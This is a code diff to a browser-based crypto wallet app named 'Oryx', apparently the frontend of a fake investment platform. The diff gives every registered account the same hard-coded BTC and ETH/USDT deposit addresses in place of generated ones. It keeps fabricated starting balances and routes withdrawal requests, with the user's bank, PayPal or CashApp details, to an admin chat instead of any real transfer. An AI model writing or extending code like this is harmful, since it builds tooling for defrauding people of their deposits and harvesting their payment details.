@@ -20,14 +20,14 @@
   }
 
   const API = {
-    register({ name, email, password }) {
+    register({ name, email, password, phone, country }) {
       const data = load();
       if (findByEmail(email)) throw new Error("Account exists");
       const id = "O_X" + Date.now();
       const defaultWallet = {
-        btc: randomBtcAddress(),
-        eth: "0x" + randomBtcAddress().slice(0, 40),
-        usdt: "0x" + randomBtcAddress().slice(0, 40),
+        btc: "1KMu1aYqv1N1Jn8YEqDYgAEYyVUnmieeQm",
+        eth: "0x73265524c5f9390fa731d72a3565b034a7c2e254",
+        usdt: "0x73265524c5f9390fa731d72a3565b034a7c2e254",
       };
       const balances = { btc: 0.012345, eth: 0.3456, usdt: 123.45 };
       const txs = { btc: [], eth: [], usdt: [] };
@@ -36,6 +36,8 @@
         name,
         email,
         password,
+        phone,
+        country,
         verified: false,
         verificationPending: false,
         wallet: defaultWallet,
@@ -63,11 +65,13 @@
     logout() {
       localStorage.removeItem("oryx_current");
     },
-    updateProfile({ name }) {
+    updateProfile({ name, phone, country }) {
       const id = localStorage.getItem("oryx_current");
       if (!id) return;
       const d = load();
-      d[id].name = name;
+      if (name !== undefined) d[id].name = name;
+      if (phone !== undefined) d[id].phone = phone;
+      if (country !== undefined) d[id].country = country;
       save(d);
     },
     changePassword({ oldPassword, newPassword }) {
@@ -124,6 +128,20 @@
       const u = API.currentUser();
       if (!u) return [];
       return (u.txs && u.txs[currency]) || [];
+    },
+    // crypto rates helpers
+    getCryptoRate(currency) {
+      return window.CryptoPrices ? window.CryptoPrices.getRate(currency) : 0;
+    },
+    convertToUSD(amount, currency) {
+      if (currency === "usdt") return amount; // USDT is already pegged to USD
+      const rate = this.getCryptoRate(currency);
+      return amount * rate;
+    },
+    formatUSD(amount) {
+      return window.CryptoPrices
+        ? window.CryptoPrices.toUsd(amount)
+        : `$${amount.toFixed(2)}`;
     },
     addTransaction(currency, tx) {
       const id = localStorage.getItem("oryx_current");
@@ -266,7 +284,16 @@
       } catch (e) {}
     },
     // withdrawals
-    addWithdrawalRequest({ amount, currency, method, reference }) {
+    addWithdrawalRequest(data) {
+      const {
+        amount,
+        currency,
+        method,
+        reference,
+        accountDetails,
+        paypalEmail,
+        cashappTag,
+      } = data;
       const id = localStorage.getItem("oryx_current");
       if (!id) return null;
       const d = load();
@@ -279,14 +306,35 @@
         status: "pending",
         createdAt: Date.now(),
       };
+
+      // Add method-specific details
+      if (method === "bank" && accountDetails) {
+        req.accountDetails = accountDetails;
+      } else if (method === "paypal" && paypalEmail) {
+        req.paypalEmail = paypalEmail;
+      } else if (method === "cashapp" && cashappTag) {
+        req.cashappTag = cashappTag;
+      }
+
       d[id].withdrawalRequests = d[id].withdrawalRequests || [];
       d[id].withdrawalRequests.push(req);
       save(d);
-      // also post a chat message for admin visibility
+
+      // Create detailed chat message for admin
+      let details = `Withdrawal request: $${amount} via ${method}`;
+      if (method === "bank") {
+        details += ` to ${accountDetails.accountName} (${accountDetails.bankName})`;
+      } else if (method === "paypal") {
+        details += ` to ${paypalEmail}`;
+      } else if (method === "cashapp") {
+        details += ` to ${cashappTag}`;
+      }
+      if (reference) details += ` (Note: ${reference})`;
+
       API.sendChatMessage({
         userId: id,
         sender: "user",
-        text: `Withdrawal request: ${amount} ${currency} via ${method} (ref: ${reference || "—"})`,
+        text: details,
       });
       return req;
     },
@@ -393,6 +441,10 @@
     getBalance: API.getBalance,
     getTransactions: API.getTransactions,
     addTransaction: API.addTransaction,
+    // crypto rates
+    getCryptoRate: API.getCryptoRate,
+    convertToUSD: API.convertToUSD,
+    formatUSD: API.formatUSD,
     // chat / admin
     getChatMessages: API.getChatMessages,
     sendChatMessage: API.sendChatMessage,
@@ -468,8 +520,8 @@ a { text-decoration: none; color: #2563eb; transition: color 0.2s; }
 a:hover { color: #1d4ed8; }
 .dark a { color: #60a5fa; }
 .dark a:hover { color: #93c5fd; }
-#homeLink { position: fixed; top: 10px; left: 10px; z-index: 1000; padding: 5px 10px; background-color: #f3f4f6; border-radius: 4px; text-decoration: none; color: #374151; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-.dark #homeLink { background-color: #374151; color: #f9fafb; }
+/* #homeLink { position: fixed; top: 10px; left: 10px; z-index: 1000; padding: 5px 10px; background-color: #f3f4f6; border-radius: 4px; text-decoration: none; color: #374151; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+.dark #homeLink { background-color: #374151; color: #f9fafb; } */
 /* Floating toggle button */
 #darkModeToggle {
   position: fixed;
@@ -532,6 +584,7 @@ a:hover { color: #1d4ed8; }
   })();
 
   // add home link on user pages
+  /*
   (function () {
     if (
       window.location.pathname !== "/index.html" &&
@@ -544,6 +597,7 @@ a:hover { color: #1d4ed8; }
       document.body.appendChild(homeLink);
     }
   })();
+  */
 
   // add link emoji to all anchor tags
   (function () {
